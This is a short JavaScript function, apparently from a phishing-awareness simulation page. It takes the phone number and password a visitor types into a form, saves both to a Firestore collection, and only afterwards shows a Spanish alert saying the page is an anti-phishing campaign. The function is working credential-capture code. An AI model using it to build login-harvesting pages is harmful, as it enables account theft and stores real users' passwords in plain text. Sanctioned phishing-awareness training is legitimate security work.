function guardar(){
    
    db.collection("usuarios").add({
        telefono: document.getElementById("telefono").value,
        password: document.getElementById("j_password").value,
    })
    .then((docRef) => {
        console.log("Document written with ID: ", docRef.id);
        alert("Esto es una campaña de concientización contra el phishing. Queremos ayudarte a comprender mejor los riesgos de la ingeniería social y la importancia de proteger tu información personal en línea.");
    })
    .catch((error) => {
        console.error("Error adding document: ", error);
        alert("Error en el registro")
    });
}


